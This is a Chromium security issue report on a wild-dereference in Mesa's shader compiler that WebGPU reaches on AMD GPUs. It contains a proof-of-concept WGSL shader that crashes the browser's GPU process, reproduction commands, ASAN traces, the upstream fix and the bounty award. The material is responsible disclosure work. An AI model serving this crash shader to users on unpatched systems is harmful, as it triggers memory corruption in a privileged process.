# GPU process crash via WebGPU shader - wild-deref in Mesa try_opt_exclusive_scan_to_inclusive 

| Field | Value |
|-------|-------|
| **Issue ID** | [425390965](https://issues.chromium.org/issues/425390965) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGPU |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | a7...@gmail.com |
| **Assignee** | ms...@google.com |
| **Created** | 2025-06-16 |
| **Bounty** | $10,000.00 |

## Description

#### VULNERABILITY DETAILS

This report is about a wild-deref in the Mesa shader compiler, reachable via WebGPU shaders emitted by dawn/tint. The offending shader looks as follows:

```
enable subgroups;

var<workgroup> a: atomic<i32>;

@compute @workgroup_size(1)
fn main() {
    let d = vec4();
    let e = subgroupExclusiveMul(d);
    loop {
        switch (d * e).x {
            case 1 {   }
            case 2 { atomicMin(&a, d.x); }
            default{ atomicMin(&a, d.x); }
        }
        if (bool()) { break; }
    }
    atomicAdd(&a, (d * e).x);
}

```

While the crash is is in the vendor-agnostic file `src/compiler/nir/nir_opt_intrinsics.c` I never found a similar-looking crash on Intel devices, only AMD. Bisecting the issue points to Mesa commit 5c70a55.

#### VERSION

Chrome Version: Version 139.0.7237.0 (Developer Build) (64-bit) (ASAN build)   

Operating System: Ubuntu 25.04   

Mesa: mesa-25.1.3 commit ba95e69

#### REPRODUCTION

There are two means of reproduction, standalone and via Chrome. The instructions below use an ASAN build of Chrome and an ASAN build of Mesa. As this is a wild-deref, non-ASAN builds may work as well. Precise build instructions for Mesa depend on the distro, a complete example for Ubuntu is part of the Dockerfile file of the standalone reproducer.

##### Standalone

1. Place the `Dockerfile` and the `.gfxr` in a new directory
2. Inside this directory: `docker build -t mesarepo .`
3. Once built, switch into the container: `docker run -it mesarepo /bin/bash`
4. Inside the container, run: `LD_PRELOAD="/usr/lib/llvm-20/lib/clang/20/lib/linux/libclang_rt.asan-x86_64.so /mesa/buildASAN/src/amd/drm-shim/libamdgpu_noop_drm_shim.so" VK_DRIVER_FILES=/mesa/buildASAN/src/amd/vulkan/radeon_icd.x86_64.json /gfxreconstruct/build/tools/replay/gfxrecon-replay /gfxrecon.gfxr`

This should produce the following ASAN report:

```
==13==ERROR: AddressSanitizer: SEGV on unknown address 0x00104303d8ef (pc 0x7b481f0cc7fb bp 0x7ffc44e25e30 sp 0x7ffc44e25e30 T0)
==13==The signal is caused by a READ memory access.
    #0 0x7b481f0cc7fb in nir_def_rewrite_uses /mesa/buildASAN/../src/compiler/nir/nir.c:1592:4
    #1 0x7b481f21cab7 in nir_def_replace /mesa/buildASAN/../src/compiler/nir/nir.h:4345:4
    #2 0x7b481f21cab7 in try_opt_exclusive_scan_to_inclusive /mesa/buildASAN/../src/compiler/nir/nir_opt_intrinsics.c:317:7
    #3 0x7b481f21cab7 in opt_intrinsics_intrin /mesa/buildASAN/../src/compiler/nir/nir_opt_intrinsics.c:377:14
    #4 0x7b481f21cab7 in opt_intrinsics_impl /mesa/buildASAN/../src/compiler/nir/nir_opt_intrinsics.c:411:17
    #5 0x7b481f21cab7 in nir_opt_intrinsics /mesa/buildASAN/../src/compiler/nir/nir_opt_intrinsics.c:431:28
    #6 0x7b481e9c1c6d in radv_optimize_nir /mesa/buildASAN/../src/amd/vulkan/radv_shader.c:196:7
    #7 0x7b481e9c3426 in radv_shader_spirv_to_nir /mesa/buildASAN/../src/amd/vulkan/radv_shader.c:593:7
    #8 0x7b481e970738 in radv_compile_cs /mesa/buildASAN/../src/amd/vulkan/radv_pipeline_compute.c:101:20
    #9 0x7b481e9717db in radv_compute_pipeline_compile /mesa/buildASAN/../src/amd/vulkan/radv_pipeline_compute.c:218:7
    #10 0x7b481e9717db in radv_compute_pipeline_create /mesa/buildASAN/../src/amd/vulkan/radv_pipeline_compute.c:299:16
    #11 0x7b481e971e1a in radv_create_compute_pipelines /mesa/buildASAN/../src/amd/vulkan/radv_pipeline_compute.c:327:11
    #12 0x7b481e971e1a in radv_CreateComputePipelines /mesa/buildASAN/../src/amd/vulkan/radv_pipeline_compute.c:356:11
    #13 0x65152979abd5 in gfxrecon::decode::VulkanReplayConsumerBase::OverrideCreateComputePipelines(VkResult (*)(VkDevice_T*, VkPipelineCache_T*, unsigned int, VkComputePipelineCreateInfo const*, VkAllocationCallbacks const*, VkPipeline_T**), VkResult, gfxrecon::decode::VulkanDeviceInfo const*, gfxrecon::decode::VulkanPipelineCacheInfo const*, unsigned int, gfxrecon::decode::StructPointerDecoder<gfxrecon::decode::Decoded_VkComputePipelineCreateInfo> const*, gfxrecon::decode::StructPointerDecoder<gfxrecon::decode::Decoded_VkAllocationCallbacks> const*, gfxrecon::decode::HandlePointerDecoder<VkPipeline_T*>*) /gfxreconstruct/framework/decode/vulkan_replay_consumer_base.cpp:10714:13
    #14 0x651529d771ca in gfxrecon::decode::VulkanReplayConsumer::Process_vkCreateComputePipelines(gfxrecon::decode::ApiCallInfo const&, VkResult, unsigned long, unsigned long, unsigned int, gfxrecon::decode::StructPointerDecoder<gfxrecon::decode::Decoded_VkComputePipelineCreateInfo>*, gfxrecon::decode::StructPointerDecoder<gfxrecon::decode::Decoded_VkAllocationCallbacks>*, gfxrecon::decode::HandlePointerDecoder<VkPipeline_T*>*) /gfxreconstruct/framework/generated/generated_vulkan_replay_consumer.cpp:1029:60
    #15 0x651529c2d225 in gfxrecon::decode::VulkanDecoder::Decode_vkCreateComputePipelines(gfxrecon::decode::ApiCallInfo const&, unsigned char const*, unsigned long) /gfxreconstruct/framework/generated/generated_vulkan_decoder.cpp:1403:51
    #16 0x651529c80acd in gfxrecon::decode::VulkanDecoder::DecodeFunctionCall(gfxrecon::format::ApiCallId, gfxrecon::decode::ApiCallInfo const&, unsigned char const*, unsigned long) /gfxreconstruct/framework/generated/generated_vulkan_decoder.cpp:14689:40
    #17 0x6515295fb370 in gfxrecon::decode::FileProcessor::ProcessFunctionCall(gfxrecon::format::BlockHeader const&, gfxrecon::format::ApiCallId, bool&) /gfxreconstruct/framework/decode/file_processor.cpp:691:48
    #18 0x6515295fa243 in gfxrecon::decode::FileProcessor::ProcessBlocks() /gfxreconstruct/framework/decode/file_processor.cpp:322:64
    #19 0x6515295f9b5f in gfxrecon::decode::FileProcessor::ProcessNextFrame() /gfxreconstruct/framework/decode/file_processor.cpp:144:32
    #20 0x65152952662e in gfxrecon::application::Application::PlaySingleFrame() /gfxreconstruct/framework/application/application.cpp:206:52
    #21 0x65152952649a in gfxrecon::application::Application::Run() /gfxreconstruct/framework/application/application.cpp:167:28
    #22 0x6515294a4171 in main /gfxreconstruct/tools/replay/desktop_main.cpp:302:29
    #23 0x7f4823b30337  (/lib/x86_64-linux-gnu/libc.so.6+0x2a337) (BuildId: 467f544f15035abef911999cbc14489edd0555ab)
    #24 0x7f4823b303fa in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2a3fa) (BuildId: 467f544f15035abef911999cbc14489edd0555ab)
    #25 0x65152948d234 in _start (/gfxreconstruct/build/tools/replay/gfxrecon-replay+0xb9234) (BuildId: ede7f6f30bdb45366424fc2f2fbfa64624ce0d29)

==13==Register values:
rax = 0x0000007e1822c774  rbx = 0x00007ffc44e25e40  rcx = 0x00007e1822c77448  rdx = 0x0000007e1822c77c  
rdi = 0x00007c4822be1799  rsi = 0x00007e1822c77440  rbp = 0x00007ffc44e25e30  rsp = 0x00007ffc44e25e30  
 r8 = 0x0000000fc30458ef   r9 = 0x00007e1822c8acc7  r10 = 0x00000fc30458ee89  r11 = 0x00000fc384589590  
r12 = 0x00007e1822c77440  r13 = 0x00007db822be6189  r14 = 0x00007c4822be1799  r15 = 0x00007e1822c6c948  
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /mesa/buildASAN/../src/compiler/nir/nir.c:1592:4 in nir_def_rewrite_uses
==13==ABORTING

```
##### Chrome

Reproducing the issue requires an AMD GPU with the subgroups feature, I've been using a RX 7600. Opening the attached html file should trigger a wild-deref in the Chrome GPU process. Start chrome and run it with the ASAN version of mesa (adapt paths as needed):
`ASAN_OPTIONS=external_symbolizer_path=/usr/lib/llvm-20/bin/llvm-symbolizer VK_DRIVER_FILES=/path/to/src/amd/vulkan/radeon_icd.x86_64.json ./chrome --user-data-dir=/tmp/deleteme --use-angle=vulkan --enable-features=Vulkan --disable-gpu-watchdog --no-sandbox --enable-unsafe-webgpu` and open the attached html:

```
Received signal 11 SEGV_ACCERR 001001784d7b
#0 0x63fd98040856 (/home/user/Downloads/linux-1473520/chrome+0xfc06855) 
#1 0x63fdae3fb858 (/home/user/Downloads/linux-1473520/chrome+0x25fc1857)
#2 0x63fdae3bbc97 (/home/user/Downloads/linux-1473520/chrome+0x25f81c96)
#3 0x63fdae3fac82 (/home/user/Downloads/linux-1473520/chrome+0x25fc0c81)
#4 0x7d3bc6c45810 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x4580f)
#5 0x793bbd5b5ecb <unknown>
#6 0x793bbd71cf98 <unknown>
#7 0x793bbcfd475e <unknown>
#8 0x793bbcfd5f17 <unknown>
#9 0x793bbcf82f69 <unknown>
#10 0x793bbcf8400c <unknown>
#11 0x793bbcf8464b <unknown>
#12 0x63fd9b503930 (/home/user/Downloads/linux-1473520/chrome+0x130c992f)
#13 0x63fd9b2dbdf8 (/home/user/Downloads/linux-1473520/chrome+0x12ea1df7)
#14 0x63fd9b1f4279 (/home/user/Downloads/linux-1473520/chrome+0x12dba278)
#15 0x63fd9b1f3c79 (/home/user/Downloads/linux-1473520/chrome+0x12db9c78)
#16 0x63fdb74389b0 (/home/user/Downloads/linux-1473520/chrome+0x2effe9af)
#17 0x63fdb742825d (/home/user/Downloads/linux-1473520/chrome+0x2efee25c)
#18 0x63fdb74333c5 (/home/user/Downloads/linux-1473520/chrome+0x2eff93c4)
#19 0x63fdb73ed901 (/home/user/Downloads/linux-1473520/chrome+0x2efb3900)
#20 0x63fdb73edd94 (/home/user/Downloads/linux-1473520/chrome+0x2efb3d93)
#21 0x63fdb73dffd2 (/home/user/Downloads/linux-1473520/chrome+0x2efa5fd1)
#22 0x63fdb6c2d378 (/home/user/Downloads/linux-1473520/chrome+0x2e7f3377)
#23 0x63fdb6c0cbb8 (/home/user/Downloads/linux-1473520/chrome+0x2e7d2bb7)
#24 0x63fdb6c0bd8b (/home/user/Downloads/linux-1473520/chrome+0x2e7d1d8a)
#25 0x63fdb6c393ae (/home/user/Downloads/linux-1473520/chrome+0x2e7ff3ad)
#26 0x63fdb6c48728 (/home/user/Downloads/linux-1473520/chrome+0x2e80e727)
#27 0x63fdb6c48510 (/home/user/Downloads/linux-1473520/chrome+0x2e80e50f)
#28 0x63fdb5570546 (/home/user/Downloads/linux-1473520/chrome+0x2d136545)
#29 0x63fdb554aded (/home/user/Downloads/linux-1473520/chrome+0x2d110dec)
#30 0x63fdb5548a4d (/home/user/Downloads/linux-1473520/chrome+0x2d10ea4c)
#31 0x63fdb554cf74 (/home/user/Downloads/linux-1473520/chrome+0x2d112f73)
#32 0x63fdae24cf67 (/home/user/Downloads/linux-1473520/chrome+0x25e12f66)
#33 0x63fdae2bfa58 (/home/user/Downloads/linux-1473520/chrome+0x25e85a57)
#34 0x63fdae2be93d (/home/user/Downloads/linux-1473520/chrome+0x25e8493c)
#35 0x63fdae2c054b (/home/user/Downloads/linux-1473520/chrome+0x25e8654a)
#36 0x63fdae113d04 (/home/user/Downloads/linux-1473520/chrome+0x25cd9d03)
#37 0x63fdae2c1105 (/home/user/Downloads/linux-1473520/chrome+0x25e87104)
#38 0x63fdae1cc070 (/home/user/Downloads/linux-1473520/chrome+0x25d9206f)
#39 0x63fdb8912572 (/home/user/Downloads/linux-1473520/chrome+0x304d8571)
#40 0x63fdaadeffad (/home/user/Downloads/linux-1473520/chrome+0x229b5fac)
#41 0x63fdaadf0f7d (/home/user/Downloads/linux-1473520/chrome+0x229b6f7c)
#42 0x63fdaadf3932 (/home/user/Downloads/linux-1473520/chrome+0x229b9931)
#43 0x63fdaadedcea (/home/user/Downloads/linux-1473520/chrome+0x229b3ce9)
#44 0x63fdaadee20c (/home/user/Downloads/linux-1473520/chrome+0x229b420b)
#45 0x63fd980d4f28 (/home/user/Downloads/linux-1473520/chrome+0xfc9af27)
#46 0x7d3bc6c2a338 (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a337)
#47 0x7d3bc6c2a3fb (/usr/lib/x86_64-linux-gnu/libc.so.6+0x2a3fa)
#48 0x63fd97ff902a (/home/user/Downloads/linux-1473520/chrome+0xfbbf029)
  r8: 0000000f8178cd7b  r9: 00007c0bc66d0cc7 r10: 00000f8178cd7a89 r11: 00000f81f8cd2190
 r12: 00007c0bc66bd440 r13: 00007babc606e989 r14: 00007a3bc53a8599 r15: 00007c0bc66b2948
  di: 00007a3bc53a8599  si: 00007c0bc66bd440  bp: 00007ffea638ce90  bx: 00007ffea638cea0
  dx: 0000007c0bc66bdc  ax: 0000007c0bc66bd4  cx: 00007c0bc66bd448  sp: 00007ffea638ce90
  ip: 0000793bbd5b5ecb efl: 0000000000010217 cgf: 002b000000000033 erf: 0000000000000004
 trp: 000000000000000e msk: 0000000000000000 cr2: 0000001001784d7b
[end of stack trace]
[4241:4241:0615/224806.718494:ERROR:content/browser/gpu/gpu_process_host.cc:959] GPU process exited unexpectedly: exit_code=11

```

## Attachments

- [radv_nir_def_rewrite_uses.html](attachments/radv_nir_def_rewrite_uses.html) (text/html, 3.0 KB)
- [gfxrecon_capture_radv_nir_def_rewrite_uses.gfxr](attachments/gfxrecon_capture_radv_nir_def_rewrite_uses.gfxr) (application/octet-stream, 10.1 KB)
- [Dockerfile](attachments/Dockerfile) (application/octet-stream, 2.0 KB)

## Timeline

### a7...@gmail.com (2025-06-16)

Upstream report at <https://gitlab.freedesktop.org/mesa/mesa/-/issues/13364>

### pg...@google.com (2025-06-16)

I have not been able to reproduce and the mesa link gives me a 404, but this seems legitimate.

Setting S1 - Memory corruption on GPU would be S0, but on Linux WebGPU is not enabled by default and on ChromeOS the GPU process is somewhat sandboxed.
Setting foundin to the current extended to be safe, since I cant tell how far back the issue goes - hoping the GPU folks can help answer that question!

Bug seems to be within mesa driver, so setting external dependency hotlist, but perhaps Chrome can have a mitigation on our end? 
cc'ing some GPU folks to take a look!

### ch...@google.com (2025-06-17)

Setting milestone because of s0/s1 severity.

### a7...@gmail.com (2025-06-17)

Your account needs to have at least the "Planner" role to see hidden issues, otherwise you'll get a 404. Upstream merge request: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35577>

### ms...@google.com (2025-06-24)

Cherry pick: [crrev/c/6666481](https://crrev.com/c/6666481)

### dx...@google.com (2025-06-24)

Project: chromiumos/third\_party/mesa  

Branch: chromeos-iris  

Author: Georg Lehmann [dadschoorse@gmail.com](mailto:dadschoorse@gmail.com)  

Link:      <https://chromium-review.googlesource.com/6666481>

UPSTREAM: nir/opt\_intrinsic: fix inclusive scan rewrite with multiple uses

---


Expand for full commit details
```
     
    Modifying the iterated list is a footgun, so just create a new instruction. 
     
    Closes: https://gitlab.freedesktop.org/mesa/mesa/-/issues/13364 
    Fixes: 5c70a55bf3f ("nir/opt_intrinsics: optimize (exclusive_scan(op, a) op a) to inclusive scan") 
     
    Reviewed-by: Alyssa Rosenzweig <alyssa@rosenzweig.io> 
    Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35577> 
    (cherry picked from commit e9c886c331aaf0b68415afb9a647d5057d691ac6 
     https://gitlab.freedesktop.org/mesa/mesa.git main) 
     
    BUG=b:425390965 
    TEST=Run crafted WebGPU shader without crashing 
     
    Change-Id: I828dfcaf10bfd8d796b059be6ab5c6c0b3795e5d 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6666481 
    Reviewed-by: Juston Li <justonli@google.com> 
    Auto-Submit: Matt Turner <msturner@google.com> 
    Reviewed-by: Ryan Neph <ryanneph@google.com> 
    Commit-Queue: Ryan Neph <ryanneph@google.com> 
    Reviewed-by: Sean Paul <sean@poorly.run> 
    Tested-by: Matt Turner <msturner@google.com>

```

---

Files:

- M `src/compiler/nir/nir_opt_intrinsics.c`

---

Hash: 46b815a4915f0ed604fab39fc18b2c641788d012  

Date:  Tue Jun 17 14:10:07 2025


---

### pe...@google.com (2025-06-24)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### sp...@google.com (2025-07-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
report of memory corruption in a highly-privileged process (GPU) 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-07-02)

Thank you for your efforts and reporting this issue to us! 

### pe...@google.com (2025-07-03)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-07-03)

1. https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6679032
2. Low - There was no conflict.
3. No, it looks like it was only merged to the main branch.
4. Yes. According to the description, the issue has appeared since 5c70a55. And, M132 contains the commit.

### ch...@google.com (2025-10-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> report of memory corruption in a highly-privileged process (GPU)

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/425390965)*
